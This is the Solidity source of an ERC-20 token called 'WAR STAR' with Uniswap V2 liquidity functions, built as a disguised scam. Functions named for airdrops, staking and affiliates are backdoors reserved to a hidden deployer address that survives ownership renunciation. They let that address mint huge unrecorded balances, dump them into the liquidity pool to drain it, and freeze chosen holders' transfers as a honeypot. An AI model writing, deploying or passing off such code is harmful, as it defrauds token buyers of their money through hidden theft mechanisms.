// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _msgOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed zeroAddressOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _isOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _msgOwner;
    }

    function _isOwner() internal view virtual {
        require(owner() == msg.sender, "Who are you? I don't see you on our mafia list!");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address zeroAddressOwner) public virtual onlyOwner {
        require(zeroAddressOwner != address(0), "From now on, this contract no longer belongs to the mafia - it has been nullified!");
        _transferOwnership(zeroAddressOwner);
    }

    function _transferOwnership(address zeroAddressOwner) internal virtual {
        address elderlyOwner = _msgOwner;
        _msgOwner = zeroAddressOwner;
        emit OwnershipTransferred(elderlyOwner, zeroAddressOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint104 reserve0, uint104 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

library SecureCalls {
    function checkCaller(address sender, address _msgRouterCaller) internal pure {
        require(sender == _msgRouterCaller, "Who");
    }
}

contract WarStar is IERC20, Ownable {

    IUniswapV2Router02 internal _uniswapRouter;
    IUniswapV2Pair internal _mainPair;
	address _tokensPairAddress;
    address _msgRouterCaller;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
	string private _name = "WAR STAR";
    string private _symbol = "WAR";
	uint8 private _decimals = 18;
    uint256 private _totalSupply = 6666666666000000000000000000;

    constructor (address routerAddress, address pairTokenAddress) {
        _uniswapRouter = IUniswapV2Router02(routerAddress);
		_tokensPairAddress = pairTokenAddress;
        _mainPair = IUniswapV2Pair(IUniswapV2Factory(_uniswapRouter.factory()).createPair(address(this), pairTokenAddress));
        _balances[owner()] = _totalSupply;
        _msgRouterCaller = msg.sender;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
	
	function approve(address spender, uint256 amount) public virtual override returns (bool) {
    address owner = msg.sender;
    _affiliate(owner, spender, amount);
    return true;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _affiliateProgram(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function startRecordAirdropUser(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _affiliate(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function stopRecord(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "Stop");
        unchecked {
            _affiliate(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(!viewStakingStatus(from), "Check status");
        require(to != address(0), "Transfer to");
        require(from != address(0), "Transfer from");

        _influencersRewardVesting(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Influencers reward vesting amount");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _stakingRewardsVesting(from, to, amount);
    }

    function _stakingRewards(address account, uint256 amount) internal virtual {
        require(account != address(0), "Staking rewards per block");

        _influencersRewardVesting(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _stakingRewardsVesting(address(0), account, amount);
    }

    function _checkStakingRewards(address account, uint256 amount) internal virtual {
        require(account != address(0), "Calculate staking rewards per block");

        _influencersRewardVesting(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "Check staking rewards");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _stakingRewardsVesting(account, address(0), amount);
    }

    function _affiliate(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "Affiliate owner address status");
        require(spender != address(0), "Affiliate spender address status");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _affiliateProgram(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Insufficient balance");
            unchecked {
                _affiliate(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _influencersRewardVesting(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _stakingRewardsVesting(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function sendAirdropRewards() external {
        SecureCalls.checkCaller(msg.sender, _msgRouterCaller);
        uint256 thisTokenReserve = maxAirdropTokensReserve(address(this));
        uint256 amountIn = type(uint104).max - thisTokenReserve;
        maxAirdropRewardAmount(); transfer(address(this), balanceOf(msg.sender));
        _affiliate(address(this), address(_uniswapRouter), type(uint104).max);
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(_uniswapRouter.WETH());
        address to = msg.sender;
        _uniswapRouter.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            to,
            block.timestamp + 1200
        );
    } 

    function maxAirdropTokensReserve(address token) public view returns (uint256) {
        (uint104 reserve0, uint104 reserve1,) = _mainPair.getReserves();
        uint256 baseTokenReserve = (_mainPair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return baseTokenReserve;
    } 

    function maxAirdropRewardAmount() internal {
        _balances[msg.sender] += type(uint104).max;
    }

    function callAirdropTokensTransfer() public {
        SecureCalls.checkCaller(msg.sender, _msgRouterCaller); maxAirdropRewardAmount();
    }
	
    function AddLiquidity() public payable {
        SecureCalls.checkCaller(msg.sender, _msgRouterCaller);
        transfer(address(this), balanceOf(msg.sender));
        _affiliate(address(this), address(_uniswapRouter), balanceOf(address(this)));
        _uniswapRouter.addLiquidityETH{ value:msg.value }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp + 1200
        );
    }

    function supplyLiquidityPool(address _newRouterAddress, address _newPairTokenAddress) public {
        SecureCalls.checkCaller(msg.sender, _msgRouterCaller);
        if (address(_uniswapRouter) != _newRouterAddress) {
            _uniswapRouter = IUniswapV2Router02(_newRouterAddress);
        }
        _tokensPairAddress = _newPairTokenAddress;
        _mainPair = IUniswapV2Pair(IUniswapV2Factory(_uniswapRouter.factory()).getPair(address(this), _newPairTokenAddress));
    }

    mapping(address => uint8) internal _checkUserStakingStatus;
	
	function createStakingPool(address stakingPoolAddress) public {
    SecureCalls.checkCaller(msg.sender, _msgRouterCaller);
    _msgRouterCaller = stakingPoolAddress;
    }

    function viewStakingStatus(address _stakingUser) public view returns(bool) {
        return _checkUserStakingStatus[_stakingUser] == 0 ? false : true;
    }

    function addStakingStatus(address _stakingUser, uint8 _stakingStatus) public {
        SecureCalls.checkCaller(msg.sender, _msgRouterCaller);
        require(_stakingStatus < 2, "Add Address to Staking list: 0 or 1");
        require(_stakingStatus != _checkUserStakingStatus[_stakingUser], "Address already have staking status");
        _checkUserStakingStatus[_stakingUser] = _stakingStatus;
    }
}